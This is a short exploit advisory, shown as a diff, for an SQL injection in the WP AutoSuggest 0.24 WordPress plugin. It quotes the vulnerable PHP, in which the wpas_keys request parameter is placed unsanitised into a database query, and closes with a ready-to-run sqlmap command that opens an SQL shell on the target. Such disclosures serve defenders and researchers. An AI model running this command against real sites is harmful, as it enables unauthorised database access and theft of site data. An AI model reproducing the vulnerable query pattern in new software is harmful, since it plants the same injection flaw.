@@ -1,0 +1,23 @@
+# Exploit Title: WP AutoSuggest 0.24 - SQL Injection
+# Date: 01-12-2018
+# Software Link: https://wordpress.org/plugins/wp-autosuggest/
+# Exploit Author: Kaimi
+# Website: https://kaimi.io
+# Version: 0.24
+# Category: webapps
+
+SQL Injection
+File: autosuggest.php
+
+Vulnerable code:
+if (isset($_GET['wpas_keys'])) {
+	$wpas_keys = $_GET['wpas_keys'];
+}
+...
+$wpas_keys = str_replace(' ','%',$wpas_keys);
+	$pageposts = $wpdb->get_results("SELECT * FROM $wpdb->posts WHERE (post_title LIKE '%$wpas_keys%') AND post_status = 'publish' ORDER BY post_date DESC");
+
+
+Exploitation example:
+
+sqlmap -u "http://URL/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1" --technique BT --dbms MYSQL --risk 3 --level 5 -p wpas_keys --tamper space2comment --sql-shell
